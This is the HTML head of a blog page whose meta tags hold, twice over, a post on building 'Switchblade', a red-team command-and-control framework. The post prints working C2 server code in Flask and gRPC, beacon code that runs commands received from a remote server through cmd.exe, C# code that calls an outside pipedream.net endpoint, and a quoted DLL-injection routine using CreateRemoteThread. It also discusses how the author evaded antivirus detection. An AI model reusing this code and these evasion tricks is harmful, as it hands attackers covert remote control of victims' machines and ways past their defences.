<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7"><meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black-translucent"><meta name="viewport" content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover" ><meta name="generator" content="Jekyll v4.4.1" /><meta property="og:title" content="Breaking Down Creating A Redteam Framework" /><meta property="og:locale" content="en" /><meta name="description" content="A Quick Review Of Where We Started Switchblade started out about a year ago with an idea taken from the leaked CIA toolset. The tool was called Switchblade, and it used mutual TLS in order to route beacons checking in versus nosy blue team defenders trying to figure out where this beacon was reaching out to. It’s a fairly simple nginx configuration that used the proxy pass method in order to send people who didn’t authenticate to a bogus page or a whole other server entirely. Really it was the beacon, an nginx configuration file, and a netcat listener. But from this came came the desire to build it out to be more. It was around this time I was reading every update that Nighthawk published and I wanted to push Switchblade to be more than just a simple executable and netcat listener. And now we’re here! Be forewarned, if you don’t like programming, the whole rest of this is dedicated to talk about programming and decisions made. Breaking It Down Let’s break down all the pieces into their respective chunks for an easier time analysing them. The Backend A good solid backend is critical to a functioning redteam framework. Without a management system that works and remembers what beacon is what, you will quickly lose track of who is who. Then you also have to think about how these beacons will communicate with the backend that is dolling out their commands and decoding the results. To this end, Flask emerged as the easiest way to manage both the tracking method and command relay. If we store the beacons as a UUID HTML file, they’re all unique and we can quickly assign them new commands to execute through an HTTP GET request, getting the results back in a POST. I also needed a way to manage running this Flask server while simultaeneously reading back results, sending updates, and general beacon management. But running this concurrently while Flask was running was not feasible. Flask, once started, blocks further input from the CLI. I could mess with concurrancy and threading, or I could deploy gRPC. I chose the latter. gRPC is a wonderful tool that was developed by Google for interacting with a number of microservices running in their data centers. It’s a remote procedure call that is designed specifically for what we are looking to do, non interruptive interaction. Let’s take a quick look at how intial beacon contact is handled through Flask after the server is started: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 @app.route(&quot;/&quot;) def home(): # Grab the appsessionid value from the headers val = request.headers[&#39;APPSESSIONID&#39;] if set(val).difference(string.ascii_letters + string.digits): # We&#39;re not going to bother with input sanitization here # If we receive special characters just drop it entirely pass else: message = &quot;whoami&quot; print(f&#39;headers:{val}&#39;) # create a new page for the UUID we got from the headers with open(f&quot;{val}.html&quot;, &quot;w&quot;) as f: f.write(message) return (&#39;&#39;) Here, when a beacon first checks in, we create an HTML file named after their UUID that they set. To avoid any nefariour command injection through the APPSESSIONID parameter, we filter out anything not needed for the UUID. Further requests from the beacon are sent to their dedicated UUID URL: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 @app.route(&#39;/&lt;path:filename&gt;&#39;, methods=[&#39;GET&#39;]) def index(filename): if request.method == &#39;GET&#39;: bID = {request.headers[&#39;APPSESSIONID&#39;]} name = request.headers[&#39;RESPONSE&#39;] print(f&#39;Host {bID} grabbed command&#39;) bID = str(bID) if set(bID).difference(string.ascii_letters + string.digits): # We&#39;re not going to bother with input sanitization here # If we receive special characters just drop it entirely pass elif set(name).difference(string.ascii_letters + string.digits): # We&#39;re not going to bother with input sanitization here # If we receive special characters just drop it entirely pass else: with open(f&#39;{bID}.html&#39;) as f: content = f.readlines() for line in content: cmd = line conn.hset(&#39;beacons&#39;, f&#39;{bID}&#39;, f&#39;{cmd}&#39;) # Add the beacon ID and command to the redis DB date = datetime.datetime.now() conn.hset(&#39;beacons&#39;, f&#39;{date}&#39;, f&#39;{bID} + {cmd}&#39;) # Create cmd history conn.hset(&#39;beacons&#39;, f&#39;{name}&#39;, f&#39;{bID}&#39;) return send_from_directory(&#39;.&#39;, filename) return jsonify(request.data) The beacon sends a GET for its specific page and again we are just dropping requests with special characters. Once it finds the page, we read the command out of it and respond back with what should be executed, also adding a command history to a Redis database. Finally, to get the results of the command: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 @app.route(&quot;/schema&quot;, methods=[&#39;POST&#39;]) def results(): if request.method == &#39;POST&#39;: bID = {request.headers[&#39;APPSESSIONID&#39;]} bID = str(bID) if set(bID).difference(string.ascii_letters + string.digits): # We&#39;re not going to bother with input sanitization here # If we receive special characters just drop it entirely pass else: total = f&#39;Result: {request.data} from beacon: {bID}&#39; response = request.data response = str(response) response = response.strip() print(response) conn.hset(&quot;beacons&quot;, bID, total) return &#39;HELO&#39; We use the request.data method as a part of Flask in order to get the contents of the POST request. We then write the results of the command to the Redis database. Then we come to the gRPC implementation. There’s much more that goes into this than just the classes here, the protobuff.proto file outlines the message types like string and bool as well as defining our expected results. For this post, however, we will only be looking at the Python class portion. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 class UnaryService(pb2_grpc.UnaryServicer): def __init__(self, *args, **kwargs): pass def GetServerResponse(self, request, context): # We need an ID (ID for beacon) and message (What to tell the beacon) message = request.message ID = request.bID opt = request.opt if set(ID).difference(string.ascii_letters + string.digits): # We&#39;re not going to bother with input sanitization here # If we receive special characters just drop it entirely pass else: if opt == &#39;SC&#39;: # If option is to set command, then write it to the file with open(f&quot;{ID}.html&quot;, &quot;w&quot;) as f: f.write(message) result = f&#39;Received command, wrote {message} to file {ID}&#39; result = {&#39;message&#39;: result, &#39;received&#39;: True} return pb2.MessageResponse(**result) elif opt == &#39;GR&#39;: # If option is to get the returned results of a beacon, page the Redis DB for the results res = conn.hget(&#39;beacons&#39;, f&#39;{ID}&#39;) res = str(res) result = f&#39;Getting status of beacon {ID}: {res}&#39; result = {&#39;message&#39;: result, &#39;received&#39;: True} return pb2.MessageResponse(**result) else: pass This class is designed to take input from the controller program and do a select number of things. We can either set a command or get the returned result. Depending on what is selected, the Redis database is paged looking for different things. This is then communicated over the protobuff back to the controller. There are a number of issues with this design that are not addressed here. First, if there is not a reverse proxy in front of the listener that’s routing bad requests away or something similar, then someone could flood the server with requests to generate enough new HTML files to cause a denial of service. Additionally, there is nothing verifying commands sent to beacons so someone could intercept them and issue their own commands to be executed. Solving the latter issue will be a matter of command signing in order to verify legitimacy, but that is still to be implemented. The Controller To interact with the backend management, we have a controller that uses the aforementioned gRPC in order to facilitate this. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 class UnaryClient(object): &quot;&quot;&quot; Client for gRPC functionality &quot;&quot;&quot; def __init__(self): self.host = &#39;localhost&#39; self.server_port = 50051 # instantiate a channel self.channel = grpc.insecure_channel( &#39;{}:{}&#39;.format(self.host, self.server_port)) # bind the client and the server self.stub = pb2_grpc.UnaryStub(self.channel) def get_url(self, message, beaconID, opt): &quot;&quot;&quot; Client function to call the rpc for GetServerResponse &quot;&quot;&quot; message = pb2.Message(bID=beaconID, message=message, opt=opt) print(f&#39;{message}&#39;) return self.stub.GetServerResponse(message) This takes an input in the form of beaconID; commandToSet; choice where the choice is if you want to set a command or get the results. The Message properties are pre-defined in the protobuff.proto file as three string parameters, and the GetServerResponse is defined to return a simple message. gRPC does a lot of heavy lifting for us here. In order to actually send the command through the UnaryClient, the following function was used: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 def SendCommand(): &#39;&#39;&#39; This uses gRPC to talk with the C2 We take the command to run and the beaconID to update and write it to the beacons file The C2 awaits the POST response and then sends that back over here :param command: The command to run :param beaconID: The beacon we want to target :return: Get the result of the command &#39;&#39;&#39; beaconID = input(&quot;Input beacon ID &gt; &quot;) command = input(&quot;If setting new command &gt; &quot;) opt = input(&quot;Get Results (GR) or Set Command (SC) &gt; &quot;) client = UnaryClient() result = client.get_url(message=command, beaconID=beaconID, opt=opt) print(f&#39;{result}&#39;) We use the get_url method defined in the UnaryClient class in order to send this newly constructed message. The Beacon The beacon is the most critical part to a redteam framework. If it’s poorly written, then alerts will pop and data will be corrupted, completely negating any benefits gained from performing these emulations. Upper management is already hesitant to do such tests, so poorly run ones will only further cement why they dislike them. Diving into the beacon, it was rewritten in two new languages for this. That was Go and C#. I had a few different motivations for doing so. The primary one was I felt like I reached the limits of Python. If I wanted to do any more specialized evasion stuff, I would need to import CTypes and at that point, why not just use C right? Additionally, with Go and C#, I could build the final beacon to be compatible for any system as opposed to just an .exe for Windows or just a .py script for Nix systems. The final overarching reason for doing so was also just to learn more. C# is incredibly powerful as outlined in previous posts here and elsewhere. You can unhook NTDLL, overwrite memory locations with what you think should go there, inject shellcode, and so on. Also note, a big reason that Virustotal does not flag these files is not because of any special evasion implemented, but because of their previously unknown structure making static analysis almost useless. Let’s start with how it went with Go first. Go was without a doubt far quicker to transition from Python to than C#. The syntax was very similar and libraries felt like they functioned much the same way. For instance, a GET request in Go would look like this: 1 2 3 4 client := http.Client{} // Make our web client structure req, err := http.NewRequest(&quot;GET&quot;, &quot;http://google.com&quot;, nil) // Define a new request req.Header.Add(&quot;User-Agent&quot;, &#39;Im a super nifty header&#39;) // Add some cool new headers resp, err := client.Do(req) // Send it off And the same thing in Python: 1 2 3 4 headers = { &#39;User-Agent&#39;: &#39;Im a super nifty header&#39; # Set up a cool header } requests.get(f&#39;http://google.com&#39;, headers=headers) # Send the request Go requires you to do a little more setup than Python, but otherwise it’s much the same. This can be seen again in the command execution function. First is how it’s performed in Go: 1 2 3 cmd := exec.Command(&quot;cmd.exe&quot;, &quot;/C&quot;, beacon_command) // exec.Command returns the Cmd struct to execute the named program with the given arguments. result, _ := cmd.Output() // And then get the output, _ here is to grab any errors hostname := []byte(result) And again in Python: 1 2 3 4 command = [&#39;cmd.exe&#39;, &#39;/c&#39;, beacon_command] # Forming the layout of the command here process = subprocess.Popen(command, close_fds=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE, shell=False) out, err = process.communicate() hostname = out.decode() A lot of time was spent on figuring out how commands should be executed. If it’s too obvious that it’s coming from a web request, the EDR will flag it. I spent a while going back and forth on how this should be done. I wanted to execute the command under an entirely new process that wouldn’t inherit any data from the parent process so as to avoid linking back. It’s actually really neat how this functions though. If you include creationflags=0x00000008, then you get a fully independant process who’s parent has died for all intents and purposes, but the command spawned still persists. But this had drawbacks. I couldn’t get the command output on things like dir and that’s a deal breaker for general execution. This is still viable though for edge case scenarios like spawning new persistent processes or sacrificial processes whos context we can execute commands in to avoid crashing the primary process. In the end, the flag for detached processes was dropped in favor of more reliable general command execution. close_fds gets us half way there by keeping the parent file descriptors from being copied to the subprocess though. The overall detection for the Go beacon was pretty low. No one on Antiscan picked it up: And only 6 vendors picked it up on Virustotal: These low detection rates can primarily be attributed to how Golang is compiled, though I was able to knock Microsoft off the detection list by first assigning the retrieved command to a new variable as opposed to passing it directly to be executed. One other point on Go, typically beacons generated from it are very hard for AV to detect. This is due to them statically linking all the necessary libraries needed for compiling, which bumps the file size up past what some AV’s can handle scanning. This isn’t a new tactic either, the Commie malware family padded 64MB of data to their compiled executables in order to avoid being scanned. Now how did it go with C#? I originally wanted to use C++ for this actually, but encountered a number of issues that C# had already resolved. The crux of the Switchblade communication design is GET and POST web requests and, surprisingly, C++ does not have an easy native way to perform these. You have to import another library in order to do this. So not a big deal, go to GitHub, grab one, import it. Ah but the one you grabbed doesn’t compile with the latest version of Visual Studio you have, so should you troubleshoot the compatability issue or use the 2019 version over the 2022 version? I’m sure more experienced developers more familiar with C++ are shouting at this with an easy solution, but in that moment it was just very confusing to figure out. Using C# though was much easier comparitively. What took essentially one line in Python, took a few more in C#, but the end result was a very stable HTTP structure. And this was all with builtin structures, no downloading 3rd party libraries from Github and installing them yourself and troubleshooting what version of VS they were made for, it just worked. 1 2 3 4 5 6 7 8 using (client) { client.BaseAddress = new Uri(&quot;https://eoqqzdfuzmgq7gg.m.pipedream.net/&quot;); HttpResponseMessage response = client.GetAsync(&quot;&quot;).Result; response.EnsureSuccessStatusCode(); string result = response.Content.ReadAsStringAsync().Result; Console.WriteLine(&quot;Result: &quot; + result); } Pretty nifty right? The original goal with using C++ was also to be able to do a bunch of advanced memory things, like injecting shellcode into running processes. C#, by nature of being a C based language, has all these tools to do memory modification that you would expect with C++! You still have things like CreateRemoteThread, WriteProcessMemory, and LoadLlibraryA. For example, look at the following code taken from Codingvision.net: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 public static int Main() { // the target process - I&#39;m using a dummy process for this // if you don&#39;t have one, open Task Manager and choose wisely Process targetProcess = Process.GetProcessesByName(&quot;testApp&quot;)[0]; // geting the handle of the process - with required privileges IntPtr procHandle = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, false, targetProcess.Id); // searching for the address of LoadLibraryA and storing it in a pointer IntPtr loadLibraryAddr = GetProcAddress(GetModuleHandle(&quot;kernel32.dll&quot;), &quot;LoadLibraryA&quot;); // name of the dll we want to inject string dllName = &quot;test.dll&quot;; // alocating some memory on the target process - enough to store the name of the dll // and storing its address in a pointer IntPtr allocMemAddress = VirtualAllocEx(procHandle, IntPtr.Zero, (uint)((dllName.Length + 1) * Marshal.SizeOf(typeof(char))), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); // writing the name of the dll there UIntPtr bytesWritten; WriteProcessMemory(procHandle, allocMemAddress, Encoding.Default.GetBytes(dllName), (uint)((dllName.Length + 1) * Marshal.SizeOf(typeof(char))), out bytesWritten); // creating a thread that will call LoadLibraryA with allocMemAddress as argument CreateRemoteThread(procHandle, IntPtr.Zero, 0, loadLibraryAddr, allocMemAddress, 0, IntPtr.Zero); return 0; } This reads strikingly similar to C++ functions designed to do the same thing. The point being that by using C# instead of C++, there’s very little sacrificed. Go was evidently easier to transition to, but C# definitely had more to teach me. Go was very forgiving with how the program coud be laid out while with C#, if you got the function declaration wrong, nothing would work. C# was also very interesting from a compilation standpoint. The program could be compiled down to a DLL through the shortcut ctrl shft b or an executable for Windows or Ubuntu with dotnet publish -c Release -r win10-x64 without issue, and this opens up even more avenues of exploitation. The detection rate for each file was also increadibly low: What Was Learned It is exhausting keeping up with all the issues that are discovered along the way, but that’s the case with any project this size. Regardless of how tiring it was, learning how to use gRPC and how to build the same application in Python, C#, and Go was really rewarding. Comparing the different detection rates between languages was interesting and shows that engines still have a long way to go with analysis, so implementing additional protections that look at behaviour is very important. Some may be wondering why the only method implemented in the beacon is direct command execution. Why not put in other tools like registry modification, file deletion, file upload, and SMB communication that don’t go through the command prompt? These are not off the table at all and all are good ideas, but for the original purposes of this project, being able to execute arbitrary commands was enough as it could do most of these functions anyways, just in a much more bulky and cumbersome manner. Another question may be why use Flask, why not handle the HTTP requests through other methods like in Go? A valid question! The primary reason for using Flask was that it was the quickest way to build it out in Python, which is the language I know the strongest. Flask has a bunch of great features as well like being able to serve TLS secured connections, though this can be worked around again using an nginx front end. Because I was able to handle everything very intuitively through Flask, I could spend more time focusing on other aspects of the framework. Or another way to put it, if you cook a lot, is to bake the bread and buy the butter." /><meta property="og:description" content="A Quick Review Of Where We Started Switchblade started out about a year ago with an idea taken from the leaked CIA toolset. The tool was called Switchblade, and it used mutual TLS in order to route beacons checking in versus nosy blue team defenders trying to figure out where this beacon was reaching out to. It’s a fairly simple nginx configuration that used the proxy pass method in order to send people who didn’t authenticate to a bogus page or a whole other server entirely. Really it was the beacon, an nginx configuration file, and a netcat listener. But from this came came the desire to build it out to be more. It was around this time I was reading every update that Nighthawk published and I wanted to push Switchblade to be more than just a simple executable and netcat listener. And now we’re here! Be forewarned, if you don’t like programming, the whole rest of this is dedicated to talk about programming and decisions made. Breaking It Down Let’s break down all the pieces into their respective chunks for an easier time analysing them. The Backend A good solid backend is critical to a functioning redteam framework. Without a management system that works and remembers what beacon is what, you will quickly lose track of who is who. Then you also have to think about how these beacons will communicate with the backend that is dolling out their commands and decoding the results. To this end, Flask emerged as the easiest way to manage both the tracking method and command relay. If we store the beacons as a UUID HTML file, they’re all unique and we can quickly assign them new commands to execute through an HTTP GET request, getting the results back in a POST. I also needed a way to manage running this Flask server while simultaeneously reading back results, sending updates, and general beacon management. But running this concurrently while Flask was running was not feasible. Flask, once started, blocks further input from the CLI. I could mess with concurrancy and threading, or I could deploy gRPC. I chose the latter. gRPC is a wonderful tool that was developed by Google for interacting with a number of microservices running in their data centers. It’s a remote procedure call that is designed specifically for what we are looking to do, non interruptive interaction. Let’s take a quick look at how intial beacon contact is handled through Flask after the server is started: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 @app.route(&quot;/&quot;) def home(): # Grab the appsessionid value from the headers val = request.headers[&#39;APPSESSIONID&#39;] if set(val).difference(string.ascii_letters + string.digits): # We&#39;re not going to bother with input sanitization here # If we receive special characters just drop it entirely pass else: message = &quot;whoami&quot; print(f&#39;headers:{val}&#39;) # create a new page for the UUID we got from the headers with open(f&quot;{val}.html&quot;, &quot;w&quot;) as f: f.write(message) return (&#39;&#39;) Here, when a beacon first checks in, we create an HTML file named after their UUID that they set. To avoid any nefariour command injection through the APPSESSIONID parameter, we filter out anything not needed for the UUID. Further requests from the beacon are sent to their dedicated UUID URL: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 @app.route(&#39;/&lt;path:filename&gt;&#39;, methods=[&#39;GET&#39;]) def index(filename): if request.method == &#39;GET&#39;: bID = {request.headers[&#39;APPSESSIONID&#39;]} name = request.headers[&#39;RESPONSE&#39;] print(f&#39;Host {bID} grabbed command&#39;) bID = str(bID) if set(bID).difference(string.ascii_letters + string.digits): # We&#39;re not going to bother with input sanitization here # If we receive special characters just drop it entirely pass elif set(name).difference(string.ascii_letters + string.digits): # We&#39;re not going to bother with input sanitization here # If we receive special characters just drop it entirely pass else: with open(f&#39;{bID}.html&#39;) as f: content = f.readlines() for line in content: cmd = line conn.hset(&#39;beacons&#39;, f&#39;{bID}&#39;, f&#39;{cmd}&#39;) # Add the beacon ID and command to the redis DB date = datetime.datetime.now() conn.hset(&#39;beacons&#39;, f&#39;{date}&#39;, f&#39;{bID} + {cmd}&#39;) # Create cmd history conn.hset(&#39;beacons&#39;, f&#39;{name}&#39;, f&#39;{bID}&#39;) return send_from_directory(&#39;.&#39;, filename) return jsonify(request.data) The beacon sends a GET for its specific page and again we are just dropping requests with special characters. Once it finds the page, we read the command out of it and respond back with what should be executed, also adding a command history to a Redis database. Finally, to get the results of the command: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 @app.route(&quot;/schema&quot;, methods=[&#39;POST&#39;]) def results(): if request.method == &#39;POST&#39;: bID = {request.headers[&#39;APPSESSIONID&#39;]} bID = str(bID) if set(bID).difference(string.ascii_letters + string.digits): # We&#39;re not going to bother with input sanitization here # If we receive special characters just drop it entirely pass else: total = f&#39;Result: {request.data} from beacon: {bID}&#39; response = request.data response = str(response) response = response.strip() print(response) conn.hset(&quot;beacons&quot;, bID, total) return &#39;HELO&#39; We use the request.data method as a part of Flask in order to get the contents of the POST request. We then write the results of the command to the Redis database. Then we come to the gRPC implementation. There’s much more that goes into this than just the classes here, the protobuff.proto file outlines the message types like string and bool as well as defining our expected results. For this post, however, we will only be looking at the Python class portion. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 class UnaryService(pb2_grpc.UnaryServicer): def __init__(self, *args, **kwargs): pass def GetServerResponse(self, request, context): # We need an ID (ID for beacon) and message (What to tell the beacon) message = request.message ID = request.bID opt = request.opt if set(ID).difference(string.ascii_letters + string.digits): # We&#39;re not going to bother with input sanitization here # If we receive special characters just drop it entirely pass else: if opt == &#39;SC&#39;: # If option is to set command, then write it to the file with open(f&quot;{ID}.html&quot;, &quot;w&quot;) as f: f.write(message) result = f&#39;Received command, wrote {message} to file {ID}&#39; result = {&#39;message&#39;: result, &#39;received&#39;: True} return pb2.MessageResponse(**result) elif opt == &#39;GR&#39;: # If option is to get the returned results of a beacon, page the Redis DB for the results res = conn.hget(&#39;beacons&#39;, f&#39;{ID}&#39;) res = str(res) result = f&#39;Getting status of beacon {ID}: {res}&#39; result = {&#39;message&#39;: result, &#39;received&#39;: True} return pb2.MessageResponse(**result) else: pass This class is designed to take input from the controller program and do a select number of things. We can either set a command or get the returned result. Depending on what is selected, the Redis database is paged looking for different things. This is then communicated over the protobuff back to the controller. There are a number of issues with this design that are not addressed here. First, if there is not a reverse proxy in front of the listener that’s routing bad requests away or something similar, then someone could flood the server with requests to generate enough new HTML files to cause a denial of service. Additionally, there is nothing verifying commands sent to beacons so someone could intercept them and issue their own commands to be executed. Solving the latter issue will be a matter of command signing in order to verify legitimacy, but that is still to be implemented. The Controller To interact with the backend management, we have a controller that uses the aforementioned gRPC in order to facilitate this. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 class UnaryClient(object): &quot;&quot;&quot; Client for gRPC functionality &quot;&quot;&quot; def __init__(self): self.host = &#39;localhost&#39; self.server_port = 50051 # instantiate a channel self.channel = grpc.insecure_channel( &#39;{}:{}&#39;.format(self.host, self.server_port)) # bind the client and the server self.stub = pb2_grpc.UnaryStub(self.channel) def get_url(self, message, beaconID, opt): &quot;&quot;&quot; Client function to call the rpc for GetServerResponse &quot;&quot;&quot; message = pb2.Message(bID=beaconID, message=message, opt=opt) print(f&#39;{message}&#39;) return self.stub.GetServerResponse(message) This takes an input in the form of beaconID; commandToSet; choice where the choice is if you want to set a command or get the results. The Message properties are pre-defined in the protobuff.proto file as three string parameters, and the GetServerResponse is defined to return a simple message. gRPC does a lot of heavy lifting for us here. In order to actually send the command through the UnaryClient, the following function was used: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 def SendCommand(): &#39;&#39;&#39; This uses gRPC to talk with the C2 We take the command to run and the beaconID to update and write it to the beacons file The C2 awaits the POST response and then sends that back over here :param command: The command to run :param beaconID: The beacon we want to target :return: Get the result of the command &#39;&#39;&#39; beaconID = input(&quot;Input beacon ID &gt; &quot;) command = input(&quot;If setting new command &gt; &quot;) opt = input(&quot;Get Results (GR) or Set Command (SC) &gt; &quot;) client = UnaryClient() result = client.get_url(message=command, beaconID=beaconID, opt=opt) print(f&#39;{result}&#39;) We use the get_url method defined in the UnaryClient class in order to send this newly constructed message. The Beacon The beacon is the most critical part to a redteam framework. If it’s poorly written, then alerts will pop and data will be corrupted, completely negating any benefits gained from performing these emulations. Upper management is already hesitant to do such tests, so poorly run ones will only further cement why they dislike them. Diving into the beacon, it was rewritten in two new languages for this. That was Go and C#. I had a few different motivations for doing so. The primary one was I felt like I reached the limits of Python. If I wanted to do any more specialized evasion stuff, I would need to import CTypes and at that point, why not just use C right? Additionally, with Go and C#, I could build the final beacon to be compatible for any system as opposed to just an .exe for Windows or just a .py script for Nix systems. The final overarching reason for doing so was also just to learn more. C# is incredibly powerful as outlined in previous posts here and elsewhere. You can unhook NTDLL, overwrite memory locations with what you think should go there, inject shellcode, and so on. Also note, a big reason that Virustotal does not flag these files is not because of any special evasion implemented, but because of their previously unknown structure making static analysis almost useless. Let’s start with how it went with Go first. Go was without a doubt far quicker to transition from Python to than C#. The syntax was very similar and libraries felt like they functioned much the same way. For instance, a GET request in Go would look like this: 1 2 3 4 client := http.Client{} // Make our web client structure req, err := http.NewRequest(&quot;GET&quot;, &quot;http://google.com&quot;, nil) // Define a new request req.Header.Add(&quot;User-Agent&quot;, &#39;Im a super nifty header&#39;) // Add some cool new headers resp, err := client.Do(req) // Send it off And the same thing in Python: 1 2 3 4 headers = { &#39;User-Agent&#39;: &#39;Im a super nifty header&#39; # Set up a cool header } requests.get(f&#39;http://google.com&#39;, headers=headers) # Send the request Go requires you to do a little more setup than Python, but otherwise it’s much the same. This can be seen again in the command execution function. First is how it’s performed in Go: 1 2 3 cmd := exec.Command(&quot;cmd.exe&quot;, &quot;/C&quot;, beacon_command) // exec.Command returns the Cmd struct to execute the named program with the given arguments. result, _ := cmd.Output() // And then get the output, _ here is to grab any errors hostname := []byte(result) And again in Python: 1 2 3 4 command = [&#39;cmd.exe&#39;, &#39;/c&#39;, beacon_command] # Forming the layout of the command here process = subprocess.Popen(command, close_fds=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE, shell=False) out, err = process.communicate() hostname = out.decode() A lot of time was spent on figuring out how commands should be executed. If it’s too obvious that it’s coming from a web request, the EDR will flag it. I spent a while going back and forth on how this should be done. I wanted to execute the command under an entirely new process that wouldn’t inherit any data from the parent process so as to avoid linking back. It’s actually really neat how this functions though. If you include creationflags=0x00000008, then you get a fully independant process who’s parent has died for all intents and purposes, but the command spawned still persists. But this had drawbacks. I couldn’t get the command output on things like dir and that’s a deal breaker for general execution. This is still viable though for edge case scenarios like spawning new persistent processes or sacrificial processes whos context we can execute commands in to avoid crashing the primary process. In the end, the flag for detached processes was dropped in favor of more reliable general command execution. close_fds gets us half way there by keeping the parent file descriptors from being copied to the subprocess though. The overall detection for the Go beacon was pretty low. No one on Antiscan picked it up: And only 6 vendors picked it up on Virustotal: These low detection rates can primarily be attributed to how Golang is compiled, though I was able to knock Microsoft off the detection list by first assigning the retrieved command to a new variable as opposed to passing it directly to be executed. One other point on Go, typically beacons generated from it are very hard for AV to detect. This is due to them statically linking all the necessary libraries needed for compiling, which bumps the file size up past what some AV’s can handle scanning. This isn’t a new tactic either, the Commie malware family padded 64MB of data to their compiled executables in order to avoid being scanned. Now how did it go with C#? I originally wanted to use C++ for this actually, but encountered a number of issues that C# had already resolved. The crux of the Switchblade communication design is GET and POST web requests and, surprisingly, C++ does not have an easy native way to perform these. You have to import another library in order to do this. So not a big deal, go to GitHub, grab one, import it. Ah but the one you grabbed doesn’t compile with the latest version of Visual Studio you have, so should you troubleshoot the compatability issue or use the 2019 version over the 2022 version? I’m sure more experienced developers more familiar with C++ are shouting at this with an easy solution, but in that moment it was just very confusing to figure out. Using C# though was much easier comparitively. What took essentially one line in Python, took a few more in C#, but the end result was a very stable HTTP structure. And this was all with builtin structures, no downloading 3rd party libraries from Github and installing them yourself and troubleshooting what version of VS they were made for, it just worked. 1 2 3 4 5 6 7 8 using (client) { client.BaseAddress = new Uri(&quot;https://eoqqzdfuzmgq7gg.m.pipedream.net/&quot;); HttpResponseMessage response = client.GetAsync(&quot;&quot;).Result; response.EnsureSuccessStatusCode(); string result = response.Content.ReadAsStringAsync().Result; Console.WriteLine(&quot;Result: &quot; + result); } Pretty nifty right? The original goal with using C++ was also to be able to do a bunch of advanced memory things, like injecting shellcode into running processes. C#, by nature of being a C based language, has all these tools to do memory modification that you would expect with C++! You still have things like CreateRemoteThread, WriteProcessMemory, and LoadLlibraryA. For example, look at the following code taken from Codingvision.net: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 public static int Main() { // the target process - I&#39;m using a dummy process for this // if you don&#39;t have one, open Task Manager and choose wisely Process targetProcess = Process.GetProcessesByName(&quot;testApp&quot;)[0]; // geting the handle of the process - with required privileges IntPtr procHandle = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, false, targetProcess.Id); // searching for the address of LoadLibraryA and storing it in a pointer IntPtr loadLibraryAddr = GetProcAddress(GetModuleHandle(&quot;kernel32.dll&quot;), &quot;LoadLibraryA&quot;); // name of the dll we want to inject string dllName = &quot;test.dll&quot;; // alocating some memory on the target process - enough to store the name of the dll // and storing its address in a pointer IntPtr allocMemAddress = VirtualAllocEx(procHandle, IntPtr.Zero, (uint)((dllName.Length + 1) * Marshal.SizeOf(typeof(char))), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); // writing the name of the dll there UIntPtr bytesWritten; WriteProcessMemory(procHandle, allocMemAddress, Encoding.Default.GetBytes(dllName), (uint)((dllName.Length + 1) * Marshal.SizeOf(typeof(char))), out bytesWritten); // creating a thread that will call LoadLibraryA with allocMemAddress as argument CreateRemoteThread(procHandle, IntPtr.Zero, 0, loadLibraryAddr, allocMemAddress, 0, IntPtr.Zero); return 0; } This reads strikingly similar to C++ functions designed to do the same thing. The point being that by using C# instead of C++, there’s very little sacrificed. Go was evidently easier to transition to, but C# definitely had more to teach me. Go was very forgiving with how the program coud be laid out while with C#, if you got the function declaration wrong, nothing would work. C# was also very interesting from a compilation standpoint. The program could be compiled down to a DLL through the shortcut ctrl shft b or an executable for Windows or Ubuntu with dotnet publish -c Release -r win10-x64 without issue, and this opens up even more avenues of exploitation. The detection rate for each file was also increadibly low: What Was Learned It is exhausting keeping up with all the issues that are discovered along the way, but that’s the case with any project this size. Regardless of how tiring it was, learning how to use gRPC and how to build the same application in Python, C#, and Go was really rewarding. Comparing the different detection rates between languages was interesting and shows that engines still have a long way to go with analysis, so implementing additional protections that look at behaviour is very important. Some may be wondering why the only method implemented in the beacon is direct command execution. Why not put in other tools like registry modification, file deletion, file upload, and SMB communication that don’t go through the command prompt? These are not off the table at all and all are good ideas, but for the original purposes of this project, being able to execute arbitrary commands was enough as it could do most of these functions anyways, just in a much more bulky and cumbersome manner. Another question may be why use Flask, why not handle the HTTP requests through other methods like in Go? A valid question! The primary reason for using Flask was that it was the quickest way to build it out in Python, which is the language I know the strongest. Flask has a bunch of great features as well like being able to serve TLS secured connections, though this can be worked around again using an nginx front end. Because I was able to handle everything very intuitively through Flask, I could spend more time focusing on other aspects of the framework. Or another way to put it, if you cook a lot, is to bake the bread and buy the butter." /><link rel="canonical" href="/posts/Breaking-Down-Creating-A-Redteam-Framework/" /><meta property="og:url" content="/posts/Breaking-Down-Creating-A-Redteam-Framework/" /><meta property="og:site_name" content="Culbert Report" /><meta property="og:type" 